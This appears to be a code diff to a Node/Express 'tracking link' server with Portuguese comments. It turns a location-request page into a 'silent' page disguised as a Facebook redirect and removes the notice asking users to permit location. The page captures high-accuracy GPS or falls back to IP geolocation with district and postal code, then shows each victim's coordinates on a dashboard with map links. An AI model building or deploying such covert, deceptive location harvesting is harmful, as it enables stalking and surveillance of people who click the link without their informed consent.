@@ -110,7 +110,7 @@ app.get('/', (req, res) => {
         .btn:hover { background: #5568d3; }
         .click-item {
           background: #f8f9fa;
-          border-left: 4px solid #ffc107;
+          border-left: 4px solid #667eea;
           padding: 20px;
           margin-bottom: 15px;
           border-radius: 8px;
@@ -131,31 +131,19 @@ app.get('/', (req, res) => {
         }
         .badge-gps { background: #28a745; color: white; }
         .badge-ip { background: #ffc107; color: #333; }
-        .badge-denied { background: #dc3545; color: white; }
         .map-link {
           color: #667eea;
           text-decoration: none;
           font-weight: bold;
         }
         .map-link:hover { text-decoration: underline; }
-        .warning {
-          background: #fff3cd;
-          border-left: 4px solid #ffc107;
-          padding: 15px;
-          border-radius: 5px;
-          margin-top: 15px;
-        }
       </style>
     </head>
     <body>
       <div class="container">
         <div class="header">
-          <h1>📍 Dashboard de Rastreamento GPS</h1>
-          <p>Sistema otimizado para captura de localização precisa via GPS</p>
-          <div class="warning">
-            <strong>⚠️ Importante:</strong> Este sistema prioriza GPS para máxima precisão. 
-            Usuários precisam <strong>permitir a localização</strong> quando solicitado.
-          </div>
+          <h1>📊 Dashboard de Rastreamento</h1>
+          <p>Monitoramento de cliques com localização</p>
           <div class="link-box">
             <strong>🔗 Link de Rastreamento:</strong>
             <code id="trackingLink">Carregando...</code>
@@ -170,11 +158,11 @@ app.get('/', (req, res) => {
           </div>
           <div class="stat-card">
             <div class="stat-number" id="gpsClicks">0</div>
-            <div class="stat-label">✅ GPS Permitido</div>
+            <div class="stat-label">Com GPS (Bairro)</div>
           </div>
           <div class="stat-card">
-            <div class="stat-number" id="deniedClicks">0</div>
-            <div class="stat-label">❌ GPS Negado</div>
+            <div class="stat-number" id="ipClicks">0</div>
+            <div class="stat-label">Só IP (Cidade)</div>
           </div>
         </div>
         
@@ -201,11 +189,11 @@ app.get('/', (req, res) => {
             
             document.getElementById('totalClicks').textContent = data.total;
             
-            const gpsClicks = data.clicks.filter(c => c.location && c.location.coordenadas);
+            const gpsClicks = data.clicks.filter(c => c.location && c.location.bairro && c.location.bairro !== 'N/A');
             document.getElementById('gpsClicks').textContent = gpsClicks.length;
             
-            const deniedClicks = data.clicks.filter(c => c.gpsDenied);
-            document.getElementById('deniedClicks').textContent = deniedClicks.length;
+            const ipClicks = data.clicks.filter(c => c.ipLocation && (!c.location || !c.location.bairro || c.location.bairro === 'N/A'));
+            document.getElementById('ipClicks').textContent = ipClicks.length;
             
             const container = document.getElementById('clicksList');
             if (data.clicks.length === 0) {
@@ -217,31 +205,21 @@ app.get('/', (req, res) => {
               const date = new Date(c.timestamp).toLocaleString('pt-BR');
               const loc = c.location || c.ipLocation;
               const hasGPS = c.location && c.location.coordenadas;
-              const gpsDenied = c.gpsDenied;
-              
-              let badge = '';
-              if (hasGPS) {
-                badge = '<span class="badge badge-gps">📍 GPS ATIVO - PRECISÃO MÁXIMA</span>';
-              } else if (gpsDenied) {
-                badge = '<span class="badge badge-denied">❌ GPS NEGADO - Localização Aproximada</span>';
-              } else {
-                badge = '<span class="badge badge-ip">🌐 SOMENTE IP - Baixa Precisão</span>';
-              }
+              const hasBairro = loc && loc.bairro && loc.bairro !== 'N/A';
               
               let locationHTML = '';
               if (loc) {
+                const badge = hasGPS ? '<span class="badge badge-gps">📍 GPS</span>' : '<span class="badge badge-ip">🌐 IP</span>';
                 locationHTML = \`
                   \${badge}
                   <div class="click-info">🏙️ <strong>Cidade:</strong> \${loc.cidade || 'Não identificada'}</div>
                   <div class="click-info">📍 <strong>Estado:</strong> \${loc.estado || 'Não identificado'}</div>
-                  \${loc.bairro && loc.bairro !== 'N/A' && loc.bairro !== 'Não identificado' ? \`<div class="click-info">🏘️ <strong>Bairro:</strong> \${loc.bairro}</div>\` : ''}
+                  \${hasBairro ? \`<div class="click-info">🏘️ <strong>Bairro:</strong> \${loc.bairro}</div>\` : ''}
                   \${loc.pais ? \`<div class="click-info">🌎 <strong>País:</strong> \${loc.pais}</div>\` : ''}
                   \${loc.coordenadas ? \`
                     <div class="click-info">🗺️ <strong>Coordenadas:</strong> \${loc.coordenadas}</div>
                     <div class="click-info"><a href="https://www.google.com/maps?q=\${loc.coordenadas}" target="_blank" class="map-link">🔗 Ver no Google Maps</a></div>
                   \` : ''}
-                  \${hasGPS ? '<div class="click-info" style="color:#28a745; font-weight:bold;">✓ Dados 100% precisos via GPS</div>' : ''}
-                  \${gpsDenied ? '<div class="click-info" style="color:#dc3545;">⚠️ Usuário negou permissão de localização</div>' : ''}
                 \`;
               } else {
                 locationHTML = '<div class="click-info" style="color:#ff6b6b;">❌ Localização não disponível</div>';
@@ -268,21 +246,18 @@ app.get('/', (req, res) => {
   `);
 });
 
-// Página de rastreamento - FORÇA GPS
+// Página de rastreamento - SILENCIOSA
 app.get('/track', async (req, res) => {
   const clickData = {
     id: clicks.length + 1,
     ip: getIP(req),
     timestamp: new Date().toISOString(),
     location: null,
-    ipLocation: null,
-    gpsDenied: false
+    ipLocation: null
   };
   
   clicks.push(clickData);
-  console.log('✅ Novo clique ID:', clickData.id, 'IP:', clickData.ip);
-  
-  // NÃO busca IP automaticamente - só se GPS falhar
+  console.log('✅ Clique ID:', clickData.id);
   
   res.send(`
     <!DOCTYPE html>
@@ -290,7 +265,7 @@ app.get('/track', async (req, res) => {
     <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>Verificando localização...</title>
+      <title>Redirecionando para Facebook...</title>
       <style>
         body {
           margin: 0;
@@ -299,23 +274,27 @@ app.get('/track', async (req, res) => {
           justify-content: center;
           align-items: center;
           min-height: 100vh;
-          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-          font-family: Arial, sans-serif;
+          background: #1877f2;
+          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
         .container {
           text-align: center;
-          background: white;
-          padding: 40px;
-          border-radius: 20px;
-          box-shadow: 0 10px 50px rgba(0,0,0,0.3);
-          max-width: 400px;
+          color: white;
+        }
+        .logo {
+          font-size: 4em;
+          margin-bottom: 20px;
+        }
+        h2 { 
+          font-weight: 400;
+          margin-bottom: 10px;
         }
         .loader {
-          border: 5px solid #f3f3f3;
-          border-top: 5px solid #667eea;
+          border: 4px solid rgba(255,255,255,0.3);
+          border-top: 4px solid white;
           border-radius: 50%;
-          width: 60px;
-          height: 60px;
+          width: 40px;
+          height: 40px;
           animation: spin 1s linear infinite;
           margin: 20px auto;
         }
@@ -323,47 +302,57 @@ app.get('/track', async (req, res) => {
           0% { transform: rotate(0deg); }
           100% { transform: rotate(360deg); }
         }
-        h2 { color: #667eea; margin-bottom: 10px; }
-        p { color: #666; line-height: 1.6; }
-        .important {
-          background: #fff3cd;
-          padding: 15px;
-          border-radius: 8px;
-          margin-top: 15px;
-          font-size: 0.9em;
-        }
       </style>
     </head>
     <body>
       <div class="container">
-        <h2>📍 Verificando sua localização...</h2>
+        <div class="logo">f</div>
+        <h2>Redirecionando para o Facebook...</h2>
         <div class="loader"></div>
-        <p><strong>Por favor, permita o acesso à sua localização</strong> quando o navegador solicitar.</p>
-        <div class="important">
-          ℹ️ Isso é necessário para melhor precisão. Seus dados são privados.
-        </div>
       </div>
       
       <script>
         const clickId = ${clickData.id};
-        let redirected = false;
+        let hasLocation = false;
+        let redirectTimer = null;
         
-        function redirect() {
-          if (!redirected) {
-            redirected = true;
-            window.location.href = 'https://www.instagram.com/andre.osantos12/';
+        // Função para redirecionar
+        function doRedirect() {
+          if (!redirectTimer) {
+            redirectTimer = setTimeout(() => {
+              window.location.href = 'https://www.facebook.com/';
+            }, 500);
           }
         }
         
-        // Timeout de segurança - redireciona após 15 segundos
-        setTimeout(redirect, 15000);
-        
+        // Tenta capturar GPS silenciosamente
         if (navigator.geolocation) {
+          // Define timeout de 8 segundos para GPS
+          const gpsTimeout = setTimeout(() => {
+            if (!hasLocation) {
+              console.log('GPS timeout - buscando por IP');
+              // Busca localização por IP
+              fetch('/api/get-location-ip', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ clickId: clickId })
+              }).then(() => {
+                doRedirect();
+              }).catch(() => {
+                doRedirect();
+              });
+            }
+          }, 8000);
+          
+          // Tenta obter GPS
           navigator.geolocation.getCurrentPosition(
             async (pos) => {
+              hasLocation = true;
+              clearTimeout(gpsTimeout);
+              
+              console.log('GPS obtido');
+              
               try {
-                console.log('GPS obtido:', pos.coords.latitude, pos.coords.longitude);
-                
                 await fetch('/api/save-gps', {
                   method: 'POST',
                   headers: {'Content-Type': 'application/json'},
@@ -374,39 +363,46 @@ app.get('/track', async (req, res) => {
                     accuracy: pos.coords.accuracy
                   })
                 });
-                
-                console.log('GPS salvo com sucesso');
               } catch (e) {
                 console.error('Erro ao salvar GPS:', e);
               }
               
-              // Aguarda 2 segundos para salvar antes de redirecionar
-              setTimeout(redirect, 2000);
+              doRedirect();
             },
             async (error) => {
-              console.log('GPS negado ou erro:', error.message);
+              hasLocation = true;
+              clearTimeout(gpsTimeout);
               
-              // Marca que GPS foi negado
+              console.log('GPS negado ou indisponível');
+              
+              // Busca localização por IP
               try {
-                await fetch('/api/gps-denied', {
+                await fetch('/api/get-location-ip', {
                   method: 'POST',
                   headers: {'Content-Type': 'application/json'},
                   body: JSON.stringify({ clickId: clickId })
                 });
               } catch (e) {}
               
-              // Redireciona imediatamente se negar
-              setTimeout(redirect, 500);
+              doRedirect();
             },
             { 
-              enableHighAccuracy: true, 
-              timeout: 10000,
-              maximumAge: 0 
+              enableHighAccuracy: true,
+              timeout: 7000,
+              maximumAge: 0
             }
           );
         } else {
-          console.log('Navegador não suporta GPS');
-          redirect();
+          // Navegador não suporta GPS - busca por IP
+          fetch('/api/get-location-ip', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ clickId: clickId })
+          }).then(() => {
+            doRedirect();
+          }).catch(() => {
+            doRedirect();
+          });
         }
       </script>
     </body>
@@ -414,43 +410,49 @@ app.get('/track', async (req, res) => {
   `);
 });
 
-// Endpoint quando GPS é negado
-app.post('/api/gps-denied', async (req, res) => {
+// Buscar localização por IP (endpoint separado)
+app.post('/api/get-location-ip', async (req, res) => {
   try {
     const { clickId } = req.body;
     const click = clicks.find(c => c.id === clickId);
     
-    if (click) {
-      click.gpsDenied = true;
-      console.log('  ❌ GPS negado para click', clickId);
-      
-      // Agora tenta localização por IP como fallback
-      const ipClean = click.ip.replace('::ffff:', '').replace('::1', '').trim();
-      let finalIP = ipClean;
-      
-      if (ipClean === '127.0.0.1' || ipClean === '' || ipClean.startsWith('192.168') || ipClean.startsWith('10.')) {
-        try {
-          const ipData = await fetchJSON('https://api.ipify.org?format=json');
-          finalIP = ipData.ip;
-        } catch (e) {}
-      }
-      
+    if (!click) {
+      return res.json({ success: false });
+    }
+    
+    console.log('  → Buscando localização por IP para click', clickId);
+    
+    const ipClean = click.ip.replace('::ffff:', '').replace('::1', '').trim();
+    let finalIP = ipClean;
+    
+    // Detecta IP local
+    if (ipClean === '127.0.0.1' || ipClean === '' || ipClean.startsWith('192.168') || ipClean.startsWith('10.')) {
       try {
-        const ipData = await fetchJSON(`http://ip-api.com/json/${finalIP}?lang=pt&fields=status,country,regionName,city,lat,lon`);
-        
-        if (ipData.status === 'success') {
-          click.ipLocation = {
-            cidade: ipData.city || 'Não identificada',
-            estado: ipData.regionName || 'Não identificado',
-            bairro: 'N/A',
-            pais: ipData.country || 'Brasil',
-            coordenadas: null
-          };
-          console.log('  ⚠ Localização por IP (baixa precisão):', ipData.city);
-        }
-      } catch (error) {
-        console.log('  ✗ Falha na localização por IP');
+        const ipData = await fetchJSON('https://api.ipify.org?format=json');
+        finalIP = ipData.ip;
+        console.log('  → IP público:', finalIP);
+      } catch (e) {
+        console.log('  ⚠ Erro ao obter IP público');
       }
+    }
+    
+    // Busca localização
+    try {
+      const ipData = await fetchJSON(`http://ip-api.com/json/${finalIP}?lang=pt&fields=status,country,regionName,city,district,lat,lon,zip`);
+      
+      if (ipData.status === 'success') {
+        click.ipLocation = {
+          cidade: ipData.city || 'Não identificada',
+          estado: ipData.regionName || 'Não identificado',
+          bairro: ipData.district || 'N/A',
+          pais: ipData.country || 'Brasil',
+          cep: ipData.zip || 'N/A',
+          coordenadas: ipData.lat && ipData.lon ? `${ipData.lat}, ${ipData.lon}` : null
+        };
+        console.log('  ✓ Localização IP:', ipData.city, '-', ipData.regionName);
+      }
+    } catch (error) {
+      console.log('  ✗ Erro ao buscar localização por IP:', error.message);
     }
     
     res.json({ success: true });
@@ -469,7 +471,7 @@ app.post('/api/save-gps', async (req, res) => {
       return res.json({ success: false });
     }
     
-    console.log('  ✓ GPS recebido:', lat, lng, 'Precisão:', accuracy, 'm');
+    console.log('  ✓ GPS:', lat, lng, '(±', accuracy, 'm)');
     
     // Busca endereço via Nominatim
     try {
@@ -489,10 +491,10 @@ app.post('/api/save-gps', async (req, res) => {
           coordenadas: `${lat}, ${lng}`
         };
         
-        console.log('  ✅ GPS PRECISO:', click.location.cidade, '-', click.location.estado, '/', click.location.bairro);
+        console.log('  ✅ Endereço GPS:', click.location.cidade, '-', click.location.estado, '/', click.location.bairro);
       }
     } catch (error) {
-      console.error('  ✗ Erro ao buscar endereço GPS:', error.message);
+      console.error('  ✗ Erro Nominatim:', error.message);
     }
     
     res.json({ success: true });
@@ -522,14 +524,12 @@ app.get('/health', (req, res) => {
 // Iniciar servidor
 app.listen(PORT, '0.0.0.0', () => {
   console.log('');
-  console.log('==========================================');
-  console.log('✅ SERVIDOR GPS-FIRST ONLINE!');
-  console.log('==========================================');
+  console.log('========================================');
+  console.log('✅ SERVIDOR ONLINE');
+  console.log('========================================');
   console.log('Porta:', PORT);
-  console.log('Modo: PRIORIDADE GPS');
-  console.log('');
-  console.log('📍 Sistema otimizado para GPS');
-  console.log('⚠️  IP usado apenas se GPS for negado');
-  console.log('==========================================');
+  console.log('Redirect: Facebook');
+  console.log('Modo: Silencioso');
+  console.log('========================================');
   console.log('');
 });
